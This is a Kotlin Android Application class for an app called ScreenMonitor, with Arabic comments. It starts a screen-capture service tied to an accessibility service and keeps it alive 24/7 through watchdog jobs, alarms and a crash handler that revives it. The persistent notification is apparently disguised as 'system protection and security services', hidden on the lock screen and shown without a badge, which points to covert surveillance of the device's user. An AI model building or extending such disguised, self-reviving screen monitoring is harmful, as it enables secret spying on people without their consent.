package com.example.screenmonitor

import android.app.Application
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import androidx.core.content.ContextCompat
import com.example.screenmonitor.data.PreferencesManager
import com.example.screenmonitor.receiver.WatchdogAlarmReceiver
import com.example.screenmonitor.service.ScreenCaptureService
import com.example.screenmonitor.service.ScreenMonitorAccessibilityService
import com.example.screenmonitor.service.WatchdogJobService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

class ScreenMonitorApp : Application() {

    companion object {
        private const val TAG = "ScreenMonitorApp"
        @Volatile var instance: ScreenMonitorApp? = null
            private set
    }

    private val appScope = CoroutineScope(SupervisorJob() + Dispatchers.Default)

    override fun onCreate() {
        super.onCreate()
        instance = this
        Log.i(TAG, "تهيئة تطبيق ScreenMonitor للعمل الدائم 24/7...")

        // 1. تثبيت حارس استثناءات عام لمنع انهيار التطبيق وإعادة إحياء الخدمة إن حدث خطأ غير متوقع
        Thread.setDefaultUncaughtExceptionHandler { thread, throwable ->
            Log.e(TAG, "استثناء غير معالج تم اعتراضه في المسار ${thread.name}: ${throwable.message}", throwable)
            try {
                // محاولة إحياء الخدمة فورياً قبل خروج المعالج
                WatchdogAlarmReceiver.scheduleImmediateWakeup(applicationContext)
            } catch (_: Throwable) {}
        }

        // 2. إنشاء قنوات الإشعارات الأساسية مبكراً
        createNotificationChannels()

        // 3. جدولة حارس الإحياء الذاتي (Watchdog Job & Alarm)
        WatchdogJobService.schedulePeriodicWatchdog(this)
        WatchdogAlarmReceiver.scheduleNextAlarm(this)

        // 4. فحص وتشغيل الخدمة تلقائياً إذا كانت خدمة إمكانية الوصول جاهزة أو المراقبة مفعلة
        appScope.launch {
            try {
                val prefs = PreferencesManager(applicationContext)
                if (prefs.isMonitoringActive) {
                    startMonitoringServiceSafely()
                }
            } catch (t: Throwable) {
                Log.e(TAG, "خطأ أثناء محاولة التشغيل التلقائي الأولي: ${t.message}")
            }
        }
    }

    fun startMonitoringServiceSafely() {
        try {
            val isAccessActive = Build.VERSION.SDK_INT >= Build.VERSION_CODES.R &&
                    ScreenMonitorAccessibilityService.isServiceEnabled(this)

            if (isAccessActive || ScreenCaptureService.savedResultData != null) {
                val intent = Intent(this, ScreenCaptureService::class.java).apply {
                    action = ScreenCaptureService.ACTION_START
                }
                ContextCompat.startForegroundService(this, intent)
                Log.i(TAG, "تم إطلاق ScreenCaptureService بنجاح عبر التشغيل التلقائي للـ Application")
            }
        } catch (t: Throwable) {
            Log.w(TAG, "تعذر تشغيل الخدمة فوراً: ${t.message}")
        }
    }

    private fun createNotificationChannels() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

            val serviceChannel = NotificationChannel(
                "screen_monitor_service_channel",
                "خدمات حماية وأمان النظام",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "خدمة خلفية مستمرة لأمان وحماية النظام"
                setShowBadge(false)
                lockscreenVisibility = android.app.Notification.VISIBILITY_SECRET
            }

            val alertsChannel = NotificationChannel(
                "screen_monitor_alerts_channel",
                "تنبيهات حالة المراقبة",
                NotificationManager.IMPORTANCE_HIGH
            ).apply {
                description = "تنبيهات عند توقف خدمة الحماية أو إعادة تشغيل الجهاز"
            }

            notificationManager.createNotificationChannels(listOf(serviceChannel, alertsChannel))
        }
    }
}
